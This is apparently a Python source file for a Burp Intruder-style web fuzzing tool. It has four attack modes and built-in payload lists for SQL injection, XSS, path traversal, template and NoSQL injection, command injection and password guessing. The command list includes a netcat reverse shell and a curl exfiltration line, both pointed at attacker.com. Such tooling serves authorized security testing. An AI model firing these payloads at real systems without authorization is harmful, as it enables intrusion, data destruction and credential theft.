"""Burp Intruder replacement — position-based HTTP fuzzing engine."""

from __future__ import annotations

import itertools
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from typing import Callable, Iterator, Optional
from urllib.parse import urlencode, urlparse

import requests


SNIPER = "sniper"
BATTERING_RAM = "battering_ram"
PITCHFORK = "pitchfork"
CLUSTER_BOMB = "cluster_bomb"

BUILTIN_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "' UNION SELECT NULL--", "1; DROP TABLE users--", "' AND 1=2 UNION SELECT 1,2,3--",
        "admin'--", "1' ORDER BY 1--", "' WAITFOR DELAY '0:0:5'--",
        "1 AND SLEEP(5)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>",
        "'-alert(1)-'", "<iframe src=javascript:alert(1)>", "{{7*7}}",
        "${7*7}", "<details open ontoggle=alert(1)>", "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "%3Cscript%3Ealert(1)%3C/script%3E",
    ],
    "traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd", "..;/..;/..;/etc/passwd",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}",
        "{{config}}", "{{self.__class__.__mro__}}", "${T(java.lang.Runtime).getRuntime()}",
        "{{request.application.__globals__.__builtins__}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "nosql": [
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}', "true, $where: '1 == 1'",
        '{"$exists":true}', "';return true;//", '{"$nin":[]}',
    ],
    "commands": [
        "; id", "| id", "$(id)", "`id`", "& id", "\n id", "; whoami",
        "| cat /etc/passwd", "$(cat /etc/passwd)", "; ping -c 3 127.0.0.1",
        "| nc -e /bin/sh attacker.com 4444", "; curl http://attacker.com/$(whoami)",
    ],
    "common_passwords": [
        "admin", "password", "123456", "12345678", "qwerty", "abc123", "monkey",
        "master", "dragon", "111111", "baseball", "iloveyou", "trustno1",
        "sunshine", "princess", "letmein", "welcome", "shadow", "superman",
    ],
    "idor": [str(i) for i in range(1, 51)],
    "numbers": [str(i) for i in range(0, 1001)],
    "short_alpha": [chr(i) for i in range(ord("a"), ord("z") + 1)],
}


@dataclass
class IntruderResult:
    """Single fuzzing attempt result."""

    position_index: int
    payload: str
    status_code: int
    content_length: int
    response_time: float
    response_body: str = ""
    response_headers: dict = field(default_factory=dict)
    error: Optional[str] = None
    diff_ratio: float = 1.0
    interesting: bool = False
    notes: list[str] = field(default_factory=list)


@dataclass
class IntruderConfig:
    """Configuration for an intruder attack."""

    base_url: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)
    body: Optional[str] = None
    positions: list[str] = field(default_factory=list)
    payloads: list[list[str]] = field(default_factory=list)
    attack_type: str = SNIPER
    threads: int = 10
    delay: float = 0.0
    timeout: int = 10
    follow_redirects: bool = False
    verify_ssl: bool = False
    match_status: Optional[list[int]] = None
    match_length: Optional[int] = None
    match_regex: Optional[str] = None
    grep_patterns: list[str] = field(default_factory=list)


class PayloadGenerator:
    """Generate payload sequences for fuzzing."""

    @staticmethod
    def from_list(items: list[str]) -> list[str]:
        return items

    @staticmethod
    def from_file(path: str) -> list[str]:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]

    @staticmethod
    def number_range(start: int, end: int, step: int = 1) -> list[str]:
        return [str(i) for i in range(start, end + 1, step)]

    @staticmethod
    def char_range(start: str, end: str) -> list[str]:
        return [chr(i) for i in range(ord(start), ord(end) + 1)]

    @staticmethod
    def dates(start_year: int = 2020, end_year: int = 2026, fmt: str = "%Y-%m-%d") -> list[str]:
        from datetime import datetime, timedelta
        results = []
        current = datetime(start_year, 1, 1)
        end = datetime(end_year, 12, 31)
        while current <= end:
            results.append(current.strftime(fmt))
            current += timedelta(days=1)
        return results

    @staticmethod
    def case_variations(word: str) -> list[str]:
        results = set()
        results.add(word.lower())
        results.add(word.upper())
        results.add(word.capitalize())
        results.add(word.swapcase())
        if len(word) <= 8:
            for combo in itertools.product(*([c.lower(), c.upper()] for c in word)):
                results.add("".join(combo))
        return sorted(results)

    @staticmethod
    def builtin(name: str) -> list[str]:
        if name not in BUILTIN_PAYLOADS:
            raise ValueError(f"Unknown payload set: {name}. Available: {list(BUILTIN_PAYLOADS)}")
        return BUILTIN_PAYLOADS[name]


class Intruder:
    """Position-based HTTP fuzzing engine with 4 attack modes."""

    POSITION_MARKER = "§"

    def __init__(self, config: IntruderConfig):
        self.config = config
        self.results: list[IntruderResult] = []
        self.baseline_response: Optional[str] = None
        self.baseline_status: Optional[int] = None
        self.baseline_length: Optional[int] = None
        self._stop = False

    def stop(self) -> None:
        self._stop = True

    def _parse_positions(self, template: str) -> list[tuple[int, int]]:
        positions = []
        marker = self.POSITION_MARKER
        i = 0
        while i < len(template):
            start = template.find(marker, i)
            if start == -1:
                break
            end = template.find(marker, start + len(marker))
            if end == -1:
                break
            positions.append((start, end + len(marker)))
            i = end + len(marker)
        return positions

    def _build_request_url(self, payloads_map: dict[int, str]) -> str:
        url = self.config.base_url
        marker = self.POSITION_MARKER
        positions = self._parse_positions(url)
        if not positions:
            return url

        result = []
        prev_end = 0
        for idx, (start, end) in enumerate(positions):
            result.append(url[prev_end:start])
            if idx in payloads_map:
                result.append(payloads_map[idx])
            else:
                result.append(url[start + len(marker) : end - len(marker)])
            prev_end = end
        result.append(url[prev_end:])
        return "".join(result)

    def _build_request_body(self, payloads_map: dict[int, str]) -> Optional[str]:
        body = self.config.body
        if not body:
            return None

        marker = self.POSITION_MARKER
        url_positions = self._parse_positions(self.config.base_url)
        body_positions = self._parse_positions(body)
        if not body_positions:
            return body

        offset = len(url_positions)
        result = []
        prev_end = 0
        for idx, (start, end) in enumerate(body_positions):
            result.append(body[prev_end:start])
            actual_idx = offset + idx
            if actual_idx in payloads_map:
                result.append(payloads_map[actual_idx])
            else:
                result.append(body[start + len(marker) : end - len(marker)])
            prev_end = end
        result.append(body[prev_end:])
        return "".join(result)

    def _generate_attack_payloads(self) -> Iterator[dict[int, str]]:
        payloads = self.config.payloads
        num_positions = len(self.config.positions) if self.config.positions else 0

        if not payloads:
            return

        if self.config.attack_type == SNIPER:
            payload_list = payloads[0] if payloads else []
            for pos_idx in range(num_positions):
                for payload in payload_list:
                    yield {pos_idx: payload}

        elif self.config.attack_type == BATTERING_RAM:
            payload_list = payloads[0] if payloads else []
            for payload in payload_list:
                yield {i: payload for i in range(num_positions)}

        elif self.config.attack_type == PITCHFORK:
            min_len = min(len(p) for p in payloads) if payloads else 0
            for i in range(min_len):
                yield {pos_idx: payloads[pos_idx][i] for pos_idx in range(min(num_positions, len(payloads)))}

        elif self.config.attack_type == CLUSTER_BOMB:
            lists = [payloads[i] if i < len(payloads) else payloads[-1] for i in range(num_positions)]
            for combo in itertools.product(*lists):
                yield {i: combo[i] for i in range(len(combo))}

    def _capture_baseline(self) -> None:
        try:
            clean_url = self.config.base_url.replace(self.POSITION_MARKER, "")
            clean_body = self.config.body.replace(self.POSITION_MARKER, "") if self.config.body else None
            resp = requests.request(
                self.config.method,
                clean_url,
                headers=self.config.headers,
                data=clean_body,
                timeout=self.config.timeout,
                verify=self.config.verify_ssl,
                allow_redirects=self.config.follow_redirects,
            )
            self.baseline_response = resp.text
            self.baseline_status = resp.status_code
            self.baseline_length = len(resp.text)
        except requests.RequestException:
            pass

    def _send_request(self, payloads_map: dict[int, str]) -> IntruderResult:
        url = self._build_request_url(payloads_map)
        body = self._build_request_body(payloads_map)
        payload_desc = ",".join(f"[{k}]={v}" for k, v in sorted(payloads_map.items()))
        pos_idx = min(payloads_map.keys()) if payloads_map else 0

        try:
            start = time.time()
            resp = requests.request(
                self.config.method,
                url,
                headers=self.config.headers,
                data=body,
                timeout=self.config.timeout,
                verify=self.config.verify_ssl,
                allow_redirects=self.config.follow_redirects,
            )
            elapsed = time.time() - start

            result = IntruderResult(
                position_index=pos_idx,
                payload=payload_desc,
                status_code=resp.status_code,
                content_length=len(resp.text),
                response_time=elapsed,
                response_body=resp.text[:10000],
                response_headers=dict(resp.headers),
            )

            if self.baseline_response:
                result.diff_ratio = SequenceMatcher(None, self.baseline_response, resp.text).quick_ratio()

            result.interesting, result.notes = self._analyze_result(result, resp)
            return result

        except requests.RequestException as exc:
            return IntruderResult(
                position_index=pos_idx,
                payload=payload_desc,
                status_code=0,
                content_length=0,
                response_time=0,
                error=str(exc),
            )

    def _analyze_result(self, result: IntruderResult, resp: requests.Response) -> tuple[bool, list[str]]:
        notes: list[str] = []
        interesting = False

        if self.config.match_status and resp.status_code in self.config.match_status:
            notes.append(f"Matched status: {resp.status_code}")
            interesting = True

        if self.config.match_length is not None and len(resp.text) != self.config.match_length:
            notes.append(f"Length differs: {len(resp.text)} vs expected {self.config.match_length}")
            interesting = True

        if self.config.match_regex:
            if re.search(self.config.match_regex, resp.text, re.IGNORECASE):
                notes.append(f"Regex matched: {self.config.match_regex}")
                interesting = True

        for pattern in self.config.grep_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                notes.append(f"Grep hit: {pattern}")
                interesting = True

        if self.baseline_status is not None and resp.status_code != self.baseline_status:
            notes.append(f"Status changed: {self.baseline_status} → {resp.status_code}")
            interesting = True

        if self.baseline_length is not None:
            length_diff = abs(len(resp.text) - self.baseline_length)
            if length_diff > 100:
                notes.append(f"Length delta: {length_diff:+d}")
                interesting = True

        if result.diff_ratio < 0.8:
            notes.append(f"Response differs significantly (ratio={result.diff_ratio:.2f})")
            interesting = True

        error_indicators = ["error", "exception", "stack trace", "syntax error", "unexpected"]
        for indicator in error_indicators:
            if indicator in resp.text.lower() and (
                self.baseline_response is None or indicator not in self.baseline_response.lower()
            ):
                notes.append(f"Error indicator: '{indicator}'")
                interesting = True
                break

        if result.response_time > 5.0:
            notes.append(f"Slow response: {result.response_time:.1f}s (possible time-based injection)")
            interesting = True

        return interesting, notes

    def run(
        self,
        progress_callback: Optional[Callable[[int, int, IntruderResult], None]] = None,
    ) -> list[IntruderResult]:
        self.results = []
        self._stop = False
        self._capture_baseline()

        attack_payloads = list(self._generate_attack_payloads())
        total = len(attack_payloads)

        if self.config.threads <= 1 or self.config.delay > 0:
            for i, payloads_map in enumerate(attack_payloads):
                if self._stop:
                    break
                result = self._send_request(payloads_map)
                self.results.append(result)
                if progress_callback:
                    progress_callback(i + 1, total, result)
                if self.config.delay > 0:
                    time.sleep(self.config.delay)
        else:
            with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
                futures = {
                    executor.submit(self._send_request, pm): idx
                    for idx, pm in enumerate(attack_payloads)
                }
                completed = 0
                for future in as_completed(futures):
                    if self._stop:
                        break
                    result = future.result()
                    self.results.append(result)
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total, result)

        return self.results

    def get_interesting(self) -> list[IntruderResult]:
        return [r for r in self.results if r.interesting]

    def summary(self) -> dict:
        interesting = self.get_interesting()
        status_dist: dict[int, int] = {}
        for r in self.results:
            status_dist[r.status_code] = status_dist.get(r.status_code, 0) + 1

        return {
            "total_requests": len(self.results),
            "interesting_count": len(interesting),
            "error_count": sum(1 for r in self.results if r.error),
            "status_distribution": status_dist,
            "avg_response_time": (
                sum(r.response_time for r in self.results) / len(self.results)
                if self.results
                else 0
            ),
            "interesting_payloads": [
                {"payload": r.payload, "status": r.status_code, "length": r.content_length, "notes": r.notes}
                for r in interesting[:50]
            ],
        }
